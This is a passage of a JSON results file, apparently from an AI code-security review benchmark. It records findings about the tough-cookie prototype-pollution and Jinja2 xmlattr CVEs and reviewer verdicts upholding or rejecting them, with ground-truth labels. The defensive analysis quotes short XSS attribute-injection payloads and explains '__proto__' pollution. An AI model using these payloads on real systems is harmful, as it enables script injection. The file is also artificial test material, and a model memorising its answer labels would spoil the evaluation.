+            "context_that_would_change_this": "A call site in the library's public API that forwards an externally/attacker-supplied value directly as the store callback (cb) argument, or exposure of MemoryCookieStore methods as an endpoint accepting an external callback. Reviewing the actual callers in cookie.js/store.js would confirm cb is always an internally-generated function.",
+            "rationale": "The callback argument in these MemoryCookieStore methods is supplied by tough-cookie's own internal CookieJar/Store plumbing, never by attacker-controlled cookie data. There is no trust boundary where untrusted input reaches the `cb` parameter, so the CWE-20 premise (\"attacker-influenced code path supplies a non-function\") is unsupported. Not validating callback type is idiomatic Node.js \u2014 passing a bad callback is a local programmer error, and a fail-fast TypeError is expected behavior, not a security defect. No injection, bypass, or attacker-reachable availability impact is demonstrated.",
+            "upheld": false
+          }
+        }
+      ],
+      "upheld": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-1321",
+          "description": "putCookie() uses attacker/application-supplied cookie.domain, cookie.path, and cookie.key values directly as property names when building the nested this.idx object (this.idx[cookie.domain][cookie.path][cookie.key] = cookie) without any validation or sanitization (e.g. rejecting '__proto__', 'constructor', 'prototype'). If a cookie with domain/path/key equal to '__proto__' (or similar) is ever stored \u2014 e.g. via a malicious Set-Cookie header processed by an HTTP client using this store \u2014 it can pollute Object.prototype, potentially leading to denial of service or, depending on how polluted properties are later consumed elsewhere in the application, more severe impacts (RCE in some gadget chains). This mirrors a known class of vulnerability in cookie-jar implementations (CWE-1321).",
+          "file": "lib/memstore.js",
+          "hit": true,
+          "line": null,
+          "remediation": "Use Object.create(null) for idx and nested maps, or use a Map instead of plain objects. Additionally validate/reject domain, path, and key values equal to '__proto__', 'constructor', or 'prototype' before indexing, and use Object.hasOwnProperty.call() guards when reading.",
+          "severity": "high",
+          "title": "Prototype pollution via unsanitized cookie.domain/path/key used as object keys",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "Three things would materially change the assessment: (1) If `this.idx` were actually initialized with `Object.create(null)` or a Map rather than the `{}` shown \u2014 I'd want to confirm the full constructor, since the diff is truncated. (2) If an upstream caller (e.g., the CookieJar/store wrapper calling putCookie) validates or rejects cookies whose domain/path/key equal `__proto__`/`constructor`/`prototype` before reaching this store \u2014 the full call chain for putCookie would confirm or refute this. (3) If `canonicalDomain`/path-normalization applied before storage provably cannot yield these reserved strings. Seeing the complete memstore.js and the calling store API would settle it, but based on the diff and the known tough-cookie CVE, the vulnerable pattern is present.",
+            "rationale": "I attempted to disprove this finding but could not. The diff shows putCookie() writing attacker-influenceable values directly as nested object property names: `this.idx[cookie.domain][cookie.path][cookie.key] = cookie`, where `this.idx = {}` is a plain object (prototype-chained to Object.prototype). There is no sanitization, no null-prototype map, and no rejection of `__proto__`/`constructor`/`prototype` anywhere in the shown code. This is in fact the exact real-world vulnerability CVE-2023-26136 in tough-cookie's MemoryCookieStore, which was fixed precisely by validating these keys (rejecting `__proto__` etc.) and by using a prototype-less object. The code shown here predates/lacks that fix.\n\nAdversarial counter-arguments I considered and why they fail:\n1. \"Framework guarantees\" \u2014 There is no framework layer here; `this.idx` is a bare object literal `{}`, so writing to `this.idx['__proto__']` traverses the prototype. Only `Object.create(null)` or a Map would neutralize it, and neither is used.\n2. \"cookie.domain/path/key are internally validated\" \u2014 In tough-cookie the key is user/server-controlled (Set-Cookie name) and domain/path derive from attacker-controllable Set-Cookie attributes or request URLs; the store itself performs no validation. Assigning `this.idx['__proto__'] = {}` is a no-op on the first level, but the nested assignment `this.idx[domain]['__proto__'][key]` / `[...]['__proto__'] = cookie` reaches Object.prototype, and more directly the historically-exploited path pollutes via these keys. The lack of any guard is the defect regardless of which exact segment triggers it.\n3. \"cb returns early / dead code\" \u2014 The duplicate `cb(null)` is sloppy but the pollution-producing assignment executes unconditionally before it.\n\nBecause I cannot find parameterization, validation, or a safe-object pattern that neutralizes the write, the finding stands.",
+            "upheld": true
+          }
+        },
+        {
+          "confidence": "high",
+          "cwe": "CWE-670",
+          "description": "putCookie() calls cb(null) unconditionally and then again returns cb(null), invoking the user-supplied callback twice for a single operation. Depending on how the callback is implemented by the caller (e.g. resolving a promise, writing an HTTP response, decrementing a counter), double invocation can cause logic errors, double-send of responses, or resource exhaustion/DoS in consuming code (CWE-670 / improper control flow).",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Ensure the callback is invoked exactly once per call; remove the duplicate cb(null) call and keep only a single 'return cb(null)'.",
+          "severity": "medium",
+          "title": "putCookie invokes the callback twice",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "If the full, unelided source of putCookie showed that `cb` is reassigned to a no-op after the first call, or that the first `cb(null)` is inside a conditional block whose brace was lost in the diff truncation, the finding would be downgraded. Seeing the complete function body (the diff is heavily elided) and any promisify wrapper the Store applies would confirm whether a second invocation is swallowed or actually harmful.",
+            "rationale": "The diff unambiguously shows putCookie executing `cb(null);` and then `return cb(null);` on two consecutive lines with no intervening control flow, branch, or early return. There is no parameterization, validation, or framework guarantee that could neutralize this \u2014 the callback is a plain caller-supplied function invoked twice per successful call. I attempted to disprove the finding by looking for a conditional that would make only one path execute, an async boundary, or a guard that nulls out `cb` after first use (a common idiom like `cb = () => {}`), but none is present; both invocations run sequentially. The surrounding methods (removeAllCookies, getAllCookies) use the correct single `return cb(null)` pattern, which highlights the duplicate as an accidental defect rather than intentional design. tough-cookie's Store interface specifies callbacks are invoked exactly once; double invocation is a real contract violation. CWE-670 (improper control flow leading to double callback) is correctly applied. Severity medium is reasonable: impact depends on caller (promisified stores would throw/ignore the second resolve, but counter-based or response-writing callers could misbehave).",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": null,
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-1321",
+          "description": "putCookie() uses attacker/server-influenced values (cookie.domain, cookie.path, cookie.key) directly as property names when building the nested index (this.idx[cookie.domain][cookie.path][cookie.key] = cookie). While the top-level and per-domain/per-path objects are created with Object.create(null) (which mitigates classic __proto__ prototype-pollution), there is no validation/sanitization of these fields anywhere in this file. If any nested object in this structure were ever created without a null prototype (e.g. during a refactor, or if cookie objects/keys are later merged into a prototype-bearing object such as during serialization/inspection), a cookie with domain/path/key equal to '__proto__', 'constructor', or 'prototype' could pollute Object.prototype. This pattern is the same root cause as historical tough-cookie prototype-pollution CVEs (e.g. CVE-2023-26136) and should be defended against explicitly rather than relying solely on Object.create(null) at this one call site.",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Validate/allow-list cookie.domain, cookie.path, and cookie.key (reject or escape '__proto__', 'constructor', 'prototype') before using them as object keys, in addition to using null-prototype containers. Consider using Map instead of plain objects for the index to eliminate prototype-chain risk entirely.",
+          "severity": "medium",
+          "title": "Potential prototype-pollution exposure via unsanitized cookie domain/path/key used as object keys"
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-705",
+          "description": "putCookie() calls cb(null) and then also `return cb(null);`, invoking the caller-supplied callback twice for a single operation. Many callback-based APIs (including Node's error-first convention and frameworks built on it) assume a callback fires exactly once; double invocation can corrupt downstream state machines, cause duplicate side effects (e.g. double-sending an HTTP response, double-committing a transaction, or double-incrementing counters used for rate limiting/billing), or trigger unhandled exceptions (e.g. 'Cannot set headers after they are sent'). This is a correctness bug with potential security-relevant side effects depending on how consumers of the cookie store react to repeated callback firing.",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Ensure the callback is invoked exactly once per call (remove the duplicate cb(null) call; just `return cb(null);`).",
+          "severity": "low",
+          "title": "putCookie() invokes the callback twice"
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-770",
+          "description": "The in-memory store has no cap on the number of domains, paths, or cookies per path, nor on the size of individual cookie values. A malicious or compromised server (or an application that blindly stores attacker-influenced Set-Cookie headers) could cause unbounded growth of this.idx, leading to memory exhaustion / denial of service of the host process.",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Impose configurable limits on the maximum number of cookies per domain/path and overall, and on individual cookie size, rejecting or evicting (e.g. LRU) cookies beyond the limit, consistent with RFC 6265 recommendations.",
+          "severity": "medium",
+          "title": "Unbounded in-memory cookie storage with no size/count limits"
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-117",
+          "description": "inspectFallback/formatDomain/formatPath build a debug string by directly concatenating cookie.domain, path, and cookie key names into a template string without escaping. If these fields can contain control characters (e.g. newlines, quotes) sourced from attacker-controlled Set-Cookie headers, the resulting string could be used to forge or inject misleading entries when this output is written to logs or consoles (log forging), complicating incident response/auditing.",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Escape or JSON-encode domain/path/key values before embedding them in human-readable inspect/log output, or strip/limit control characters.",
+          "severity": "low",
+          "title": "Unescaped cookie domain/path/name interpolated into inspect() output"
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-20",
+          "description": "putCookie() does not validate the shape or types of the incoming cookie object (domain, path, key) before using them to index into this.idx. Malformed or unexpected values (e.g. non-string domain/path, extremely long strings, or objects with unexpected own properties) are accepted without checks, which can lead to inconsistent store state, type-confusion in later getAllCookies/findCookies logic, or amplify the resource-exhaustion and prototype-pollution concerns noted separately.",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Validate that cookie.domain, cookie.path, and cookie.key are non-empty strings of bounded length and reject/callback-with-error otherwise before storing.",
+          "severity": "low",
+          "title": "Missing input validation on cookie object fields in putCookie"
+        }
+      ],
+      "id": "cve-2023-26136-tough-cookie-negative",
+      "is_vulnerable": false,
+      "rejected": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-1321",
+          "description": "putCookie() uses attacker/server-influenced values (cookie.domain, cookie.path, cookie.key) directly as property names when building the nested index (this.idx[cookie.domain][cookie.path][cookie.key] = cookie). While the top-level and per-domain/per-path objects are created with Object.create(null) (which mitigates classic __proto__ prototype-pollution), there is no validation/sanitization of these fields anywhere in this file. If any nested object in this structure were ever created without a null prototype (e.g. during a refactor, or if cookie objects/keys are later merged into a prototype-bearing object such as during serialization/inspection), a cookie with domain/path/key equal to '__proto__', 'constructor', or 'prototype' could pollute Object.prototype. This pattern is the same root cause as historical tough-cookie prototype-pollution CVEs (e.g. CVE-2023-26136) and should be defended against explicitly rather than relying solely on Object.create(null) at this one call site.",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Validate/allow-list cookie.domain, cookie.path, and cookie.key (reject or escape '__proto__', 'constructor', 'prototype') before using them as object keys, in addition to using null-prototype containers. Consider using Map instead of plain objects for the index to eliminate prototype-chain risk entirely.",
+          "severity": "medium",
+          "title": "Potential prototype-pollution exposure via unsanitized cookie domain/path/key used as object keys",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "I would revise toward upholding if, elsewhere in the full file or module, (a) any of these nested index objects is reconstructed with `{}` or `Object.assign({}, ...)` rather than `Object.create(null)`; (b) `cookie.key`/`cookie.domain`/`cookie.path` values flow into a merge/clone utility (e.g. lodash `set`/`merge`, or `Object.assign` onto a `{}` target) during serialization, `toJSON`, or deserialization; or (c) a `getAllCookies`/`findCookies` path copies these keys onto a plain-object accumulator. The diff is truncated (getAllCookies body and the full file are cut off), so confirming those sinks are absent would fully close it; their presence would make the finding valid.",
+            "rationale": "The current code is safe, and the finding concedes as much. Every object that receives an attacker-influenced key as a property name is created with `Object.create(null)`:\n\n1. `this.idx = Object.create(null)` (constructor and `removeAllCookies`)\n2. `this.idx[cookie.domain] = Object.create(null)` before any `cookie.path` key is written\n3. `this.idx[cookie.domain][cookie.path] = Object.create(null)` before any `cookie.key` key is written\n\nA null-prototype object has no prototype chain and no `__proto__` accessor, so assigning `obj[\"__proto__\"] = x` (or `constructor`/`prototype`) merely creates a plain own property on that object \u2014 it does NOT walk up to and mutate `Object.prototype`. This is precisely the remediation applied for CVE-2023-26136; the code already implements the fix the finding cites. The only key the cookie value itself is written under is `cookie.key` on a null-proto object, so even the innermost level is protected.\n\nThe finding does not describe an actual present-day pollution path. It is explicitly conditional on hypothetical future states: \"if any nested object ... were ever created without a null prototype (e.g. during a refactor)\" or \"if cookie objects/keys are later merged into a prototype-bearing object.\" Those are speculative defense-in-depth suggestions about code that does not exist, not a vulnerability in this diff. The inspection helpers (`inspectFallback`/`formatDomain`/`formatPath`) only read keys via `Object.keys()` and string-concatenate them for display \u2014 they never assign them as property names on a prototype-bearing object, so the serialization/inspection concern is also unsubstantiated.\n\nPer the standard for upholding (uphold only if the finding cannot be disproved), this is disproven: no reachable sink pollutes `Object.prototype` in the code as written.",
+            "upheld": false
+          }
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-770",
+          "description": "The in-memory store has no cap on the number of domains, paths, or cookies per path, nor on the size of individual cookie values. A malicious or compromised server (or an application that blindly stores attacker-influenced Set-Cookie headers) could cause unbounded growth of this.idx, leading to memory exhaustion / denial of service of the host process.",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Impose configurable limits on the maximum number of cookies per domain/path and overall, and on individual cookie size, rejecting or evicting (e.g. LRU) cookies beyond the limit, consistent with RFC 6265 recommendations.",
+          "severity": "medium",
+          "title": "Unbounded in-memory cookie storage with no size/count limits",
+          "verdict": {
+            "confidence": "medium",
+            "context_that_would_change_this": "1) Evidence this store is used server-side to persist cookies from untrusted clients with no upstream throttling would elevate the risk. 2) The CookieJar.setCookie path \u2014 if it (unusually) enforces no per-domain cookie count limit AND is driven by attacker-controlled bulk input, theoretical growth is possible, though limit policy still belongs upstream. 3) Any library contract/docs claiming MemoryCookieStore is meant to be bounded.",
+            "rationale": "This is the canonical tough-cookie MemoryCookieStore reference implementation. The factual claim (\"no size/count caps\") is literally true, but it is the intentional, documented design of a general-purpose in-memory Store abstraction \u2014 bounding is deliberately delegated to the consumer, who can supply a persistent/LRU-backed store via the same interface. The diff introduces no attacker-controlled amplification: putCookie persists exactly one already-parsed, already-validated Cookie that the upstream CookieJar (which enforces domain/path matching and public-suffix rules) chose to store. An attacker server can only set cookies for domains it controls. RFC 6265 treats cookie count/size limits as user-agent policy, not store responsibility, and this is a client-side jar whose growth is bounded in practice by application behavior and HTTP header-size limits. Labeling a standard default store's lack of arbitrary caps as a medium CWE-770 DoS is a design observation dressed as a vulnerability, not an actionable bug in this code.",
+            "upheld": false
+          }
+        },
+        {
+          "confidence": "high",
+          "cwe": "CWE-20",
+          "description": "putCookie() does not validate the shape or types of the incoming cookie object (domain, path, key) before using them to index into this.idx. Malformed or unexpected values (e.g. non-string domain/path, extremely long strings, or objects with unexpected own properties) are accepted without checks, which can lead to inconsistent store state, type-confusion in later getAllCookies/findCookies logic, or amplify the resource-exhaustion and prototype-pollution concerns noted separately.",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Validate that cookie.domain, cookie.path, and cookie.key are non-empty strings of bounded length and reject/callback-with-error otherwise before storing.",
+          "severity": "low",
+          "title": "Missing input validation on cookie object fields in putCookie",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "I would revise upward if: (a) call sites show `putCookie` is exposed as a public API receiving untrusted/attacker-controlled objects without any prior Cookie construction/validation; (b) `this.idx` or any nested level were created with `{}` instead of `Object.create(null)` somewhere (making prototype pollution reachable); or (c) downstream `getAllCookies`/`findCookies` logic performs operations (e.g., `.toLowerCase()`, regex, path arithmetic) that assume string types and would throw/misbehave on non-string domain/path, with a demonstrated path for non-string values to reach putCookie.",
+            "rationale": "This finding does not survive adversarial review. It describes a design pattern as a vulnerability rather than an actual exploitable defect.\n\n1. Context: This is the Store implementation of tough-cookie (MemoryCookieStore). `putCookie` is not a public entry point for arbitrary/untrusted input \u2014 it is an internal Store contract method invoked by the CookieJar after a Cookie has already been constructed and normalized via `Cookie.parse`/canonicalization. By the time a cookie reaches `putCookie`, `domain`, `path`, and `key` are already strings produced by the library's own parsing (canonicalDomain, defaultPath, etc.). The Store API explicitly documents that it trusts the Cookie object shape passed by the Jar; validation is the Jar's responsibility, not the Store's. Pushing type-checking into every Store method would duplicate validation that already occurred upstream \u2014 an intentional layering decision, not an oversight.\n\n2. \"Prototype pollution\" is specifically mitigated here: the diff shows `this.idx = Object.create(null)` and all nested levels use `Object.create(null)`. Null-prototype objects have no `__proto__` setter, so indexing `this.idx[cookie.domain]` with \"__proto__\"/\"constructor\"/\"prototype\" cannot pollute Object.prototype. The code change actually *hardens* against the concern the finding gestures at.\n\n3. The asserted harms are speculative and non-specific: \"inconsistent store state\", \"type-confusion in later logic\", \"amplify resource-exhaustion\". No concrete exploit path is given. Using a non-string key simply coerces to a string property name \u2014 standard, well-defined JS object behavior, not type confusion. \"Extremely long strings\" is a theoretical memory concern bounded entirely by whatever already parsed the cookie, not introduced by this method.\n\n4. Severity is already self-rated \"low\" and the description repeatedly defers to \"concerns noted separately\" \u2014 i.e., it is scaffolding around other findings rather than an independent vulnerability.\n\nNet: the behavior is an intentional, documented trust boundary (Jar validates, Store stores), and the one concrete attack class mentioned (prototype pollution) is explicitly defended against by Object.create(null). I cannot construct an exploit, so the finding is a false positive.",
+            "upheld": false
+          }
+        }
+      ],
+      "upheld": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-705",
+          "description": "putCookie() calls cb(null) and then also `return cb(null);`, invoking the caller-supplied callback twice for a single operation. Many callback-based APIs (including Node's error-first convention and frameworks built on it) assume a callback fires exactly once; double invocation can corrupt downstream state machines, cause duplicate side effects (e.g. double-sending an HTTP response, double-committing a transaction, or double-incrementing counters used for rate limiting/billing), or trigger unhandled exceptions (e.g. 'Cannot set headers after they are sent'). This is a correctness bug with potential security-relevant side effects depending on how consumers of the cookie store react to repeated callback firing.",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Ensure the callback is invoked exactly once per call (remove the duplicate cb(null) call; just `return cb(null);`).",
+          "severity": "low",
+          "title": "putCookie() invokes the callback twice",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "If `cb` were wrapped by a `once()`/idempotency guard at the call sites that always invoke `putCookie` (e.g. tough-cookie's Store base class or CookieJar passing a one-shot callback), the second invocation would be a harmless no-op, further confirming low severity but not negating the code defect. The full definitions of the enclosing class and the call sites in cookie.js/CookieJar would confirm actual downstream impact; however, nothing there could make the two literal `cb(null)` calls not fire twice.",
+            "rationale": "The diff is unambiguous on the exact point in question. Within a single `putCookie` call, the function body executes `cb(null);` as a bare statement and then immediately `return cb(null);` \u2014 two unconditional invocations of the same caller-supplied callback on every code path, for one logical operation. There is no branch, guard flag, or early return separating them; both lines run sequentially. I attempted to disprove this by looking for a reason the double call could be benign: (1) No `once`-style wrapping is visible at the definition. (2) This is the Store interface from tough-cookie; CookieJar wraps these callbacks with pMap/async helpers that genuinely assume single invocation, so a second call can resolve/reject an already-settled promise or re-enter the continuation. (3) The first `cb(null)` is not conditional on an error short-circuit \u2014 it is plainly redundant with the returned call. There is no parameterization or framework guarantee that neutralizes a literal duplicate statement. The code-level defect (CWE-705, improper control flow / callback contract violation) is real exactly as described. I down-rate only the security framing, not the bug: the concrete exploitable impact (double HTTP response, double billing) depends on consumer behavior not present in this diff, and tough-cookie's own CookieJar generally tolerates the second no-op callback, which is why 'low' severity is appropriate. The underlying finding \u2014 callback invoked twice \u2014 stands and cannot be disproven.",
+            "upheld": true
+          }
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-117",
+          "description": "inspectFallback/formatDomain/formatPath build a debug string by directly concatenating cookie.domain, path, and cookie key names into a template string without escaping. If these fields can contain control characters (e.g. newlines, quotes) sourced from attacker-controlled Set-Cookie headers, the resulting string could be used to forge or inject misleading entries when this output is written to logs or consoles (log forging), complicating incident response/auditing.",
+          "file": "lib/memstore.js",
+          "hit": false,
+          "line": null,
+          "remediation": "Escape or JSON-encode domain/path/key values before embedding them in human-readable inspect/log output, or strip/limit control characters.",
+          "severity": "low",
+          "title": "Unescaped cookie domain/path/name interpolated into inspect() output",
+          "verdict": {
+            "confidence": "low",
+            "context_that_would_change_this": "The following would flip me toward FALSE POSITIVE: (1) Confirmation that Cookie.key/path/domain are always sanitized of control characters at construction/parse time (e.g., a validation regex in the Cookie class that rejects \\r\\n and other control chars), which would make injection impossible even via the programmatic API. (2) Evidence that this inspect() output is explicitly documented as debug-only and never passed to a logger. Conversely, confidence would increase (toward medium) if a call site routes store.inspect()/console.log(store) output into a persistent audit log and cookies can be created from attacker-controlled key/path values.",
+            "rationale": "I attempted to disprove this finding but cannot fully eliminate the risk, so I uphold it at low confidence while noting it is weak and highly context-dependent.\n\nDisproof attempts (arguments the code is safe):\n1. This is the tough-cookie library's MemoryStore. The three interpolated values are cookie.domain, cookie.path, and cookie.key \u2014 all of which normally pass through tough-cookie's canonicalization/parsing before being stored via putCookie. canonicalDomain() lowercases and normalizes the host (no realistic newline injection), and paths/keys parsed from real Set-Cookie headers are constrained because HTTP header folding/control chars are rejected at the transport layer. Under normal network-sourced input, control characters are unlikely to survive to storage.\n2. inspect() is a util.inspect custom-hook / developer debugging convenience, not a logging sink. CWE-117 log forging only materializes if a developer explicitly routes this inspect output into a shared log/console and an attacker controls the fields. The library itself never writes this to a log.\n3. Severity is correctly rated 'low' and the finding's own wording (\"if these fields can contain control characters\") is conditional/speculative.\n\nWhy I cannot fully disprove it:\n- The MemoryStore API is public: callers can construct and store Cookie objects with arbitrary domain/path/key values programmatically (bypassing Set-Cookie parsing), so the \"validated input\" guarantee is not airtight.\n- Node's native util.inspect escapes control characters in string output; this hand-rolled fallback does NOT escape '${domainName}', '${pathName}', or ${cookieName}, so it is objectively less safe than the behavior it substitutes for. That is a genuine, if minor, gap.\n- I could not inspect the Cookie parsing/canonicalization source in this diff to confirm keys/paths are guaranteed free of control characters.\n\nNet: a real but low-impact, defense-in-depth issue on a debug-only code path.",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-79",
+      "generator_only": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-79",
+          "description": "do_xmlattr() builds `key=\"value\"` pairs by calling escape() on both the key and the value, then joining them with spaces to form an HTML/XML attribute string. escape() only neutralizes the characters `& < > \" '`; it does NOT escape whitespace, `=`, `/`, or other characters that are structurally significant in an attribute list. If an attacker can control a dict key that reaches this filter (e.g. a template renders `{{ user_supplied_dict|xmlattr }}` where keys come from query params, JSON bodies, or other untrusted sources), a key such as `foo onclick=alert(1) x` or `foo=\"bar\" onmouseover=alert(1) y=\"` will pass through escape() unchanged (none of those characters require HTML escaping) and will be emitted verbatim between attributes, letting the attacker inject arbitrary new attributes (including event handlers) or break out of the intended attribute boundary. This reproduces the class of issue fixed upstream as CVE-2024-22195, where escaping values alone was insufficient because attribute *names* were not validated/restricted.",
+          "file": "src/jinja2/filters.py",
+          "hit": true,
+          "line": 20,
+          "remediation": "Do not rely on HTML-escaping alone for attribute names. Validate each key against a strict allow-list for valid XML/HTML attribute-name characters (e.g. reject or raise an error on keys containing whitespace, `=`, `/`, `<`, `>`, quotes, or control characters) before including it in the output, in addition to escaping the value. Raise a clear error (e.g. ValueError) for invalid keys rather than silently emitting them.",
+          "severity": "high",
+          "title": "xmlattr filter allows attribute/HTML injection via unsanitized dict keys"
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-116",
+          "description": "The shown fragment of do_xmlattr ends after computing `rv` and does not show the function wrapping the result in Markup(rv) when eval_ctx.autoescape is true (as the upstream filter does) nor a return statement. If the final implementation omits wrapping the already-escaped string in Markup under an active autoescape context, the escaped output could be double-escaped (breaking legitimate output) or, conversely, if escaping is skipped under the assumption Markup wrapping will handle it, raw unescaped content could be emitted. This may simply be an artifact of the diff being truncated, but should be verified against the full function body.",
+          "file": "src/jinja2/filters.py",
+          "hit": false,
+          "line": 25,
+          "remediation": "Ensure the function explicitly returns Markup(rv) only when eval_ctx.autoescape is true, and plain str otherwise, consistent with how escape()/Markup are used elsewhere in the filters module, so downstream rendering does not re-escape or under-escape the result.",
+          "severity": "low",
+          "title": "Filter result not marked as safe Markup when autoescaping is enabled (possible incomplete escaping context)"
+        }
+      ],
+      "id": "cve-2024-22195-jinja-positive",
+      "is_vulnerable": true,
+      "rejected": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-116",
+          "description": "The shown fragment of do_xmlattr ends after computing `rv` and does not show the function wrapping the result in Markup(rv) when eval_ctx.autoescape is true (as the upstream filter does) nor a return statement. If the final implementation omits wrapping the already-escaped string in Markup under an active autoescape context, the escaped output could be double-escaped (breaking legitimate output) or, conversely, if escaping is skipped under the assumption Markup wrapping will handle it, raw unescaped content could be emitted. This may simply be an artifact of the diff being truncated, but should be verified against the full function body.",
+          "file": "src/jinja2/filters.py",
+          "hit": false,
+          "line": 25,
+          "remediation": "Ensure the function explicitly returns Markup(rv) only when eval_ctx.autoescape is true, and plain str otherwise, consistent with how escape()/Markup are used elsewhere in the filters module, so downstream rendering does not re-escape or under-escape the result.",
+          "severity": "low",
+          "title": "Filter result not marked as safe Markup when autoescaping is enabled (possible incomplete escaping context)",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "The full function body beyond line 25. If it genuinely omitted the `Markup(rv)` wrap under autoescape, it would still be only a non-exploitable double-escaping correctness defect, not a security vulnerability \u2014 so even that context would not elevate it to a valid security finding.",
+            "rationale": "The finding is a false positive. (1) It is based on an explicitly truncated new-file diff that ends mid-function at line 25 with no return statement; the function is annotated `-> str`, uses `@pass_eval_context`, and never references `eval_ctx` in the shown lines, proving the body continues below \u2014 where upstream Jinja2 has exactly the `if eval_ctx.autoescape: rv = Markup(rv); return rv` code the finding worries is missing. (2) More decisively, the security-impacting branch of the claim ('raw unescaped content could be emitted') is impossible: every key and value is unconditionally passed through `escape()`, so output is always escaped regardless of the final Markup wrap. The only failure mode of omitting the Markup wrap is harmless double-escaping (a cosmetic/correctness bug), not an injection. There is no reachable XSS / improper-encoding vulnerability (CWE-116).",
+            "upheld": false
+          }
+        }
+      ],
+      "upheld": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-79",
+          "description": "do_xmlattr() builds `key=\"value\"` pairs by calling escape() on both the key and the value, then joining them with spaces to form an HTML/XML attribute string. escape() only neutralizes the characters `& < > \" '`; it does NOT escape whitespace, `=`, `/`, or other characters that are structurally significant in an attribute list. If an attacker can control a dict key that reaches this filter (e.g. a template renders `{{ user_supplied_dict|xmlattr }}` where keys come from query params, JSON bodies, or other untrusted sources), a key such as `foo onclick=alert(1) x` or `foo=\"bar\" onmouseover=alert(1) y=\"` will pass through escape() unchanged (none of those characters require HTML escaping) and will be emitted verbatim between attributes, letting the attacker inject arbitrary new attributes (including event handlers) or break out of the intended attribute boundary. This reproduces the class of issue fixed upstream as CVE-2024-22195, where escaping values alone was insufficient because attribute *names* were not validated/restricted.",
+          "file": "src/jinja2/filters.py",
+          "hit": true,
+          "line": 20,
+          "remediation": "Do not rely on HTML-escaping alone for attribute names. Validate each key against a strict allow-list for valid XML/HTML attribute-name characters (e.g. reject or raise an error on keys containing whitespace, `=`, `/`, `<`, `>`, quotes, or control characters) before including it in the output, in addition to escaping the value. Raise a clear error (e.g. ValueError) for invalid keys rather than silently emitting them.",
+          "severity": "high",
+          "title": "xmlattr filter allows attribute/HTML injection via unsanitized dict keys",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "What would weaken/flip the assessment: (1) a later line in filters.py (beyond the 25 lines shown) that validates or rejects keys containing space/`=`/`/`/`>` before the join \u2014 the diff appears to be a fresh file but is truncated, so confirming no downstream sanitization wrapper exists would matter; (2) if `escape` here is not markupsafe.escape but a custom function that also escapes whitespace/`=` (worth checking the import at top of the module); (3) evidence that keys are always developer-controlled constants in all call sites and can never be driven by untrusted input \u2014 this would lower real-world severity though not code-level correctness.",
+            "rationale": "I attempted to disprove this finding and could not. The diff shows `do_xmlattr` building attribute pairs as `f'{escape(key)}=\"{escape(value)}\"'` joined by spaces, with NO validation of the key beyond the `escape()` call. `markupsafe.escape()` only neutralizes `& < > \" '` \u2014 it does not touch space, `=`, `/`, or `\\t`/`\\n`, all of which are structurally significant in an XML/HTML attribute list. A key like `foo onclick=alert(1)` or `x tabindex=0 onmouseover=alert(1)` survives escaping intact and is emitted verbatim between attributes, allowing injection of new attributes/event handlers. This is precisely CVE-2024-22195, whose official fix added a guard rejecting keys containing space, `/`, `>`, or `=` (raising ValueError) \u2014 a guard that is absent from this code. The value side is escaped but the key side's structural characters are not, so value-only escaping is insufficient exactly as the finding states. The only mitigating factors I could find are exploitation preconditions (attacker must control dict *keys* reaching the filter), but those do not make the code itself safe; the sink is genuinely injectable.",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": null,
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-79",
+          "description": "do_xmlattr() builds `key=\"value\"` HTML/XML attribute strings from an arbitrary mapping. The only validation performed on the key is a check for ASCII whitespace via `_space_re`; if a space is found, a ValueError is raised. This is the known fix for the Jinja2 xmlattr attribute-injection issue (an unescaped space in a key previously allowed an attacker who controls dict keys to inject additional HTML attributes/event handlers, e.g. `{'onmouseover': '...', 'a b': 'c'}` style payloads breaking out of the intended single attribute). While the whitespace check mitigates the primary known exploit vector, the control is narrow (only ASCII whitespace) and relies entirely on this single regex check being present and correctly invoked on every code path that builds attribute strings from untrusted keys. If any caller constructs similar attribute strings elsewhere without reusing this same whitespace check (or if the check is ever weakened/removed in a refactor), the HTML/attribute injection reappears. Because `key` is also run through `escape()`, quote/angle-bracket characters in the key are neutralized, which is good defense-in-depth, but the security of the whole filter still hinges on this single, easily-overlooked whitespace guard plus the escaping, both of which should be covered by regression tests tied explicitly to the historical CVE.",
+          "file": "src/jinja2/filters.py",
